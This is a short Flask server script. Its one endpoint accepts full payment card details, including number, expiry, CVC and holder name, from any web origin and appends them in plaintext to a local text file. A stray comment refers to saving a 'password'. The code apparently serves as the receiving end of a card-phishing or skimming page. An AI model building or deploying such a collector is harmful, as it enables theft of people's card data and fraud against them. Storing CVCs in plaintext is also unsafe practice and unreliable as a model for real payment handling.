from flask import Flask, request, jsonify
from flask_cors import CORS 
import os

app = Flask(__name__)
CORS(app)

data_file = "card_data.txt"




@app.route('/submit', methods=['POST'])
def submit_data():
   # Get the data from the request
   data = request.get_json()


   card_number = data.get('card_number')
   mm = data.get('mm')
   yy = data.get('yy')
   cvc = data.get('cvc')
   holder_name = data.get('holder_name')


   if card_number and mm and yy and holder_name and cvc:
       # Open the file in append mode and save the card_number and password
       with open(data_file, 'a') as file:
           file.write(f"Card Number: {card_number}, Month: {mm}, Year: {yy}, CVC: {cvc}, Name: {holder_name}\n")


       return jsonify({"message": "Data saved successfully"}), 200
   else:
       return jsonify({"message": "Invalid data"}), 400




if __name__ == '__main__':
   # Ensure the file exists or create it if necessary
   if not os.path.exists(data_file):
       with open(data_file, 'w') as f:
           pass  # Just create the file if it doesn't exist
   app.run(debug=True, port=8000)
